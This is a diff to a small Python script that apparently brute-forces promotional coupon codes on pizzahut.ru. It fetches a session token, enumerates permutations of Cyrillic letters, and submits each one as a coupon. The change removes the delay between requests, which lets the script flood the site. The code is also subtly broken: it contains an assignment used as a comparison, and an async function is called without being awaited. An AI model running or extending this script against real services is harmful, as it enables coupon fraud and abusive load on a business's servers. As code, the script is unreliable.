@@ -13,14 +13,17 @@ def get_token(html):
 def gen(start_len,stop_len,token):
     ru = "абвгдеёжзийклмнопрстуфхцчшщъыьэюя"
     digits = "1234567890 "
-    abc=ru+digits
+    abc=ru
+    l=0
     for i in range(start_len,stop_len):
         res = itertools.permutations(abc ,i)
         for i in res:
             k=''.join(i)
             get_promo(token,k)
-            time.sleep(0.01)
-            print(i)
+            l=l+1
+            if l=10000:
+                l=0
+                print(i)
 async def get_promo(token,code):
     data={'_token': token,
           'coupon': code }
@@ -39,4 +42,4 @@ print('Плехали')
 url='https://pizzahut.ru'
 s=requests.Session()
 token1=get_token(get_html(url))
-gen(5,7,token1)
+gen(5,6,token1)
